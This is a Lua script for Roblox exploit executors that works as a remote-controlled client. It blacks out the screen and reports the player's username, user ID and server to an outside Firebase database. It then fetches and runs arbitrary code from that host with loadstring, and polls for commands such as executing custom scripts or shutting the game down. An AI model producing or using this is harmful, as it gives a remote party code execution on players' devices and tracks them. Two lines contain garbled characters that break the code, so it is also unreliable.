-- Carter's DHC Mobile Script
-- Designed for Delta and other mobile executors

-- Function to make screen black
local function makeScreenBlack()
    if game:GetService("CoreGui") then
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "BlackScreenGui"
        screenGui.IgnoreGuiInset = true
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.BorderSizePixel = 0
        frame.Parent = screenGui
        
        screenGui.Parent = game:GetService("CoreGui")
    end
end

-- Function to check and execute scripts from Firebase
local function checkAndExecuteScript()
    local url = "https://omebgle-default-rtdb.firebaseio.com/script.json"
    
    -- Use executor's HTTP functions (compatible with Delta)
    local success, response = pcall(function()
        return (syn and syn.request or http_request or request)({
            Url = url,
            Method = "GET"
        }).Body
    end)
    
    if not success then
        -- Fallback for executors that use different HTTP functions
        success, response = pcall(function()
            return game:HttpGet(url, true)
        end)
    end
    
    if success then
        local data = game:GetService("HttpService"):JSONDecode(response)
        if data and data.code and data.code ~= "" then
            -- Execute the script
            local executeSuccess, errorMsg = pcall(function()
                loadstring(data.code)()
            end)
            
            if not executeSuccess then
                warn("Script execution error: " .. errorMsg)
            else
                -- Clear the script from DB after successful execution
                pcall(function()
                    (syn and syn.request or http_request or request)({
                        Url = url,
                        Method = "PUT",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = '{"code":""}'
                    })
                end)
            end
        end
    else
        warn("Failed to fetch from database: " .. response)
    end
end

-- Get player info for tracking
local function getPlayerInfo()
    local player = game.Players.LocalPlayer
    if player then
        return {
            username = player.Name,
            userid = player.UserId,
            serverid = game.JobId,
            placeid = game.PlaceId,
            status = "connected"
        }
    end
    return nil
end

-- Send player info to database for tracking
local function sendPlayerInfo()
    local playerInfo = getPlayerInfo()
    if playerInfo then
        pcall(function()
            (syn and syn.request or http_request or request)({
                Url = "https://omebgle-default-rtdb.firebaseio.com/players/" .. playerInfo.userid .. ".json",
                Method = "PUT",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSON极ncode(playerInfo)
            })
        end)
    end
end

-- Send heartbeat to database
local function sendHeartbeat()
    local playerInfo =极tPlayerInfo()
    if playerInfo then
        pcall(function()
            (syn and syn.request or http_request or request)({
                Url = "https://omebgle-default-rtdb.firebaseio.com/heartbeats/" .. playerInfo.userid .. ".json",
                Method = "PUT",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode({
                    timestamp = os.time(),
                    userid = playerInfo.userid
                })
            })
        end)
    end
end

-- Function to handle commands from website
local function checkCommands(userId)
    local commandUrl = "https://omebgle-default-rtdb.firebaseio.com/commands/" .. userId .. ".json"
    
    local success, response = pcall(function()
        return (syn and syn.request or http_request or request)({
            Url = commandUrl,
            Method = "GET"
        }).Body
    end)
    
    if success then
        local data = game:GetService("HttpService"):JSONDecode(response)
        if data and data.command and data.command ~= "" then
            -- Execute the command
            if data.command == "re-execute" then
                checkAndExecuteScript()
            elseif data.command == "execute-custom" and data.script then
                local executeSuccess, errorMsg = pcall(function()
                    loadstring(data.script)()
                end)
                if not executeSuccess then
                    warn("Custom script execution error: " .. errorMsg)
                end
            elseif data.command == "leave" then
                game:Shutdown()
            elseif data.command == "rejoin" then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
            elseif data.command == "serverhop" then
                -- Server hop implementation would go here
                print("Server hop command received")
            end
            
            -- Clear the command after 5 seconds
            delay(5, function()
                pcall(function()
                    (syn and syn.request or http_request or request)({
                        Url = commandUrl,
                        Method = "PUT",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = '{"command":""}'
                    })
                end)
            end)
        end
    end
end

-- Initial setup
makeScreenBlack()
sendPlayerInfo()

-- Execute script once
checkAndExecuteScript()

-- Set up to check for commands and send heartbeats
local playerInfo = getPlayerInfo()
if playerInfo then
    spawn(function()
        while true do
            wait(10) -- Send heartbeat every 10 seconds
            sendHeartbeat()
            sendPlayerInfo() -- Update presence
            checkCommands(playerInfo.userid) -- Check for commands
        end
    end)
end

print("Carter's DHC Mobile Controller loaded successfully!")
print("Script executed once successfully!")
